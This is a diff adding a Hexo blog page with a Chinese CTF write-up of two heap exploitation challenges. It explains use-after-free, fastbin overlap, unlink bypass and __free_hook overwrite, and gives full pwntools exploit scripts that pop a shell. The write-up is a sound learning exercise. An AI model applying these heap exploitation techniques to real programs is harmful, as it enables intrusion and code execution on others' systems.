@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-heap_writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/03/04/heap_writeup/" class="article-date">
+  <time class="dt-published" datetime="2021-03-04T03:03:54.000Z" itemprop="datePublished">2021-03-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Write-Up/">Write-Up</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/03/04/heap_writeup/">简单堆题write-up</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="ACTF-2019-babyheap"><a href="#ACTF-2019-babyheap" class="headerlink" title="ACTF_2019_babyheap"></a>ACTF_2019_babyheap</h2><p>经典的notebook题目结构, 堆利用当中最简单的类型</p>
+<p>有</p>
+<pre><code>==============================
+This is a heap exploit demo  
+==============================
+1. Create something           
+2. Delete something           
+3. Print something            
+4. Exit    
+</code></pre>
+<p>create, delete, print 三个选项。</p>
+<p>创建的结构体如下</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>字符串指针</td>
+<td>函数指针</td>
+</tr>
+</tbody></table>
+<p>字符串也由<code>malloc()</code>创建，且可以任意指定其长度和内容。<br><code>free()</code>的时候也没有清空内容。</p>
+<p>利用思路很明显了：<br>create两次，其中字符串的内容不重要，只要保证其释放后不被放入<code>0x20</code>的fastbin中。</p>
+<p>此处使这这两个字符串大小为<code>0x20</code>，因此他们被释放后会被放入<code>0x30</code>的字符串当中。</p>
+<p>释放这两个note之后的fastbin如下</p>
+<table>
+<thead>
+<tr>
+<th>0x20</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>note0</td>
+</tr>
+<tr>
+<td>🠗</td>
+</tr>
+<tr>
+<td>note1</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>0x30</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>String0</td>
+</tr>
+<tr>
+<td>🠗</td>
+</tr>
+<tr>
+<td>String1</td>
+</tr>
+</tbody></table>
+<p>再次create,但申请的字符串大小为0x10（chunk大小即为0x20）。fastbin是FILO(first in last out)的，那么</p>
+<pre><code>note2 = note1
+string2 = note0
+</code></pre>
+<p>题目bss段中贴心的准备了<code>/bin/sh</code>字符串，也有<code>system</code>函数。<br>在create时向string2中写入</p>
+<pre><code>binsh地址 |  system的PLT表地址
+</code></pre>
+<p>print选项调用note0.函数指针，就能成功调用<code>system(&#39;/bin/sh&#39;)</code>，完整payload如下</p>
+<pre><code>if len(sys.argv) &gt;1 and sys.argv[1] == &#39;r&#39;:
+    target = remote()
+else:
+    target = process(&quot;./ACTF_2019_babyheap&quot;)
+    if(len(sys.argv)&gt;1) and sys.argv[1]==&#39;g&#39;:
+        gdb.attach(target)
+
+context.log_level=&#39;debug&#39;
+
+binsh=0x602010
+system_plt = 0x4007A0
+def s(in_put):
+    target.sendlineafter(&quot;choice: &quot;,in_put)
+    
+    
+def create(size,content):
+    s(&quot;1&quot;)
+    target.recvuntil(&quot;size: \n&quot;)
+    target.sendline(str(size))
+    target.recvuntil(&quot;content: \n&quot;)
+    target.send(content)
+    
+    
+def delete(index):
+    s(&quot;2&quot;)
+    target.recvuntil(&quot;index: \n&quot;)
+    target.sendline(str(index))
+    
+    
+def pwn():
+    create(0x20,&quot;A&quot;*8+&quot;\n&quot;)
+    create(0x20,&quot;B&quot;*8+&quot;\n&quot;)
+    
+    delete(0)
+    delete(1)
+    create(0x10,p64(binsh)+p64(system_plt))
+
+    #use print at index 0 to getshell after this
+
+
+    target.interactive()
+
+
+pwn()
+</code></pre>
+<hr>
+<h2 id="WDB-2018-1st-babyheap"><a href="#WDB-2018-1st-babyheap" class="headerlink" title="WDB_2018_1st_babyheap"></a>WDB_2018_1st_babyheap</h2><p>同样是菜单题目,设计的十分巧妙,涉及到了很多堆的知识点.</p>
+<pre><code>I thought this is really baby.What about u?
+Loading.....
+1.alloc
+2.edit
+3.show
+4.free
+5.exit
+Choice:
+</code></pre>
+<p>漏洞点出在<code>4.free</code> 选项中,调用<code>free()</code>之后没有清空指针,存在UAF.<br>但是<code>2.edit</code>的使用次数被限制在了三次以内.</p>
+<p>思路如下: </p>
+<ol>
+<li><p>我们希望覆盖<code>__free_hook</code>为<code>system</code> (或者直接覆盖为一个one_gadget),因此我们需要泄露libc,并通过Unlink实现任意地址写</p>
+</li>
+<li><p>unsorted bin中的<code>fd</code>指向<code>main_arena</code>,我们需要将一个chunk放入unsorted bin并利用UAF泄露<code>main_arena</code>,以此泄露libc<br>同时,我们也要将chunk送入unsorted bin 以触发unlink</p>
+</li>
+<li><p>程序只允许我们<code>malloc()</code> 0x20大小的内存(即0x30大小的chunk),因此我们需要通过UAF,overlap 与fastbin attack构造fake chunk</p>
+</li>
+<li><p>想要实现步骤3, 需要我们泄露堆地址</p>
+</li>
+</ol>
+<p>那么先从泄露堆地址开始做</p>
+<pre><code>alloc(0,&quot;a\n&quot;)
+alloc(1,&quot;b\n&quot;)
+free(1)
+free(0)
+
+show(0)
+heap_leak = u64(target.recv(6).ljust(8,&#39;\x00&#39;))
+success(hex(heap_leak))
+</code></pre>
+<p>fastbin是FILO的,两次<code>free</code>之后,fastbins 如下<br>|fastbin|<br>|-|<br>|chunk0 @index0|<br>|🠗|<br>|chunk1 @index1|</p>
+<p>chunk0-&gt;fd指向chunk1,因此<code>show(0)</code>可以泄露出chunk1的Prev_size地址(即heap+0x30)<br>注意此处释放顺序,第一个chunk地址低字节是\x00且程序为小端序,因此调换释放顺序后,我们无法用chunk1泄露chunk0的地址.</p>
+<p>然后进行fastbin attack,构造chunk重叠</p>
+<pre><code>edit(0,p64(heap_leak-0x10)+p64(0)+p64(0)+p64(0x31))
+</code></pre>
+<p>如此,chunk0的fd便指向 chunk1-0x10, 也就是chunk0+0x20的位置.<br>我们那里构建一个size为0x30的fake chunk,造成chunk重叠.</p>
+<p>接着进行分配,要记得fastbin是FILO的</p>
+<pre><code>alloc(6,&quot;aaaa\n&quot;)  #chunk0 @index6
+alloc(7,p64(0)+p64(0xa1)+&quot;\n&quot;) #fake chunk @index7
+</code></pre>
+<p>我们获取到的fake chunk @index7指向 chunk1-0x10,因此对其mem区域进行编辑,便能够编辑到 chunk1的size.</p>
+<p>将该fakechunk填充至0x90 大小</p>
+<pre><code>alloc(2,&quot;CCCCCCC\n&quot;)
+alloc(3,&quot;DDDDDDD\n&quot;)
+</code></pre>
+<p>最终的任意地址写需要依靠unlink实现,此处开始构造<br>chunk4 @index4 的prev_size 与 size会被算在fake chunk内,因此我们可以再伪造一个fake chunk.<br>0x602080即是index4地址</p>
+<p>剩下的就是常规绕过unlink检查的操作,</p>
+<pre><code>#bypass unlink check
+alloc(4,p64(0)+p64(0x31)+p64(0x602080-0x18)+p64(0x602080-0x10))
+alloc(5,p64(0x30)+p64(0x30)+&#39;\n&#39;)
+</code></pre>
+<p>释放0xa1大小的fake chunk, 他会被放入unsorted bin中.<br>回顾, unsorted bin中的<code>fd</code>指向<code>main_arena</code>, 依此泄露出libc</p>
+<pre><code>free(1)
+show(1)
+</code></pre>
+<p>同时,我们也触发了unlink,index4(0x602080) 会指向 index1 (0x602080-0x18 = 0x602068)</p>
+<p>之后利用edit函数实现任意地址写,改<code>__free_hook</code> 为 <code>system</code>.<br>类似地,我们也可以改<code>__free_hook</code>为one_gadget</p>
+<pre><code>edit(4,p64(free_hook)+&quot;\n&quot;)
+edit(1,p64(system)+&quot;\n&quot;)
+
+alloc(8,&quot;/bin/sh\x00&quot;+&#39;\n&#39;)
+free(8)
+</code></pre>
+<p>完整exp</p>
+<pre><code>from pwn import *
+import sys
+
+
+if len(sys.argv) &gt;1 and sys.argv[1] == &#39;r&#39;:
+    target = remote(&quot;node3.buuoj.cn&quot;,26070 )
+else:
+    #target = process(&quot;&quot;)
+    target=process([&quot;/home/trident/ctfworkspace/glibc/glibc-all-in-one-master/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;,&quot;./wdb_2018_1st_babyheap&quot;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)
+    if(len(sys.argv)&gt;1) and sys.argv[1]==&#39;g&#39;:
+        gdb.attach(target)
+
+context.log_level=&#39;debug&#39;
+#context.update(arch=&#39;&#39;)
+#gdb.attach(target)
+libC = ELF(&quot;./libc.so.6&quot;)
+
+
+def alloc(index,content):
+    target.recvuntil(&quot;oice:&quot;)
+    target.sendline(&quot;1&quot;)
+
+    target.recvuntil(&quot;Index:&quot;)
+    target.sendline(str(index))
+    target.recvuntil(&quot;tent:&quot;)
+    target.send(content)
+
+def edit(index,content):
+    target.recvuntil(&quot;oice:&quot;)
+    target.sendline(&quot;2&quot;)
+    target.recvuntil(&quot;Index:&quot;)
+    target.sendline(str(index))
+    target.recvuntil(&quot;tent:&quot;)
+    target.send(content)
+
+
+def show(index):
+    target.recvuntil(&quot;oice:&quot;)
+    target.sendline(&quot;3&quot;)
+    target.recvuntil(&quot;Index:&quot;)
+    target.sendline(str(index))
+
+
+def free(index):
+    target.recvuntil(&quot;oice:&quot;)
+    target.sendline(&quot;4&quot;)
+    target.recvuntil(&quot;Index:&quot;)
+    target.sendline(str(index))
+
+
+
+def pwn():
+    alloc(0,&quot;a\n&quot;)
+    alloc(1,&quot;b\n&quot;)
+    free(1)
+    free(0)
+    
+    show(0)
+    heap_leak = u64(target.recv(6).ljust(8,&#39;\x00&#39;)) 
+    success(hex(heap_leak))
+    
+    edit(0,p64(heap_leak-0x10)+p64(0)+p64(0)+p64(0x31))
+    
+    alloc(6,&quot;aaaa\n&quot;)
+    alloc(7,p64(0)+p64(0xa1)+&quot;\n&quot;)
+    alloc(2,&quot;CCCCCCC\n&quot;)
+    alloc(3,&quot;DDDDDDD\n&quot;)
+
+    alloc(4,p64(0)+p64(0x31)+p64(0x602080-0x18)+p64(0x602080-0x10)) #bypass unlink check
+    alloc(5,p64(0x30)+p64(0x30)+&#39;\n&#39;)
+    
+
+
+    free(1)
+    show(1)
+    
+    leak2 = u64(target.recv(6).ljust(8,&#39;\x00&#39;))
+    success(hex(leak2))
+    libc_leak = leak2 - 0x3c4b78
+    success(&quot;leaked libc: &quot; + hex(libc_leak))
+    
+
+    system = libc_leak + 0x45390
+    success(&quot;system: &quot; + hex(system))
+    free_hook = libc_leak + libC.symbols[&#39;__free_hook&#39;]
+    success(&quot;free_hook: &quot;+hex(free_hook))
+    
+    edit(4,p64(free_hook)+&quot;\n&quot;)
+    edit(1,p64(system)+&quot;\n&quot;)
+    
+    alloc(8,&quot;/bin/sh\x00&quot;+&#39;\n&#39;)
+    free(8)
+
+    target.interactive()
+
+
+pwn()
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/03/04/heap_writeup/" data-id="cknpnedx3000028cbg4toel6g" data-title="简单堆题write-up" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/write-up/" rel="tag">write-up</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Write-Up/">Write-Up</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/write-up/" rel="tag">write-up</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/heap/" style="font-size: 10px;">heap</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/write-up/" style="font-size: 10px;">write-up</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/03/04/heap_writeup/">简单堆题write-up</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
